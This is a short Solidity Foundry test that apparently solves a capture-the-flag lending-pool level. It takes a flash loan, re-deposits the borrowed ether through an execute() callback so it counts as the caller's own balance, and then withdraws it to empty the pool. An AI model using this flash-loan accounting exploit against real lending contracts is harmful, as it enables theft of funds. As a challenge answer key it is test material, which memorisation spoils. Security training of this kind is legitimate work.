// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;
    uint256 deposit = 0.1 ether;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        instance.flashLoan(deposit);
        instance.deposit{value: deposit}();
        instance.withdraw();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }

    function execute() external payable {
        instance.deposit{value: deposit}();
    }
}
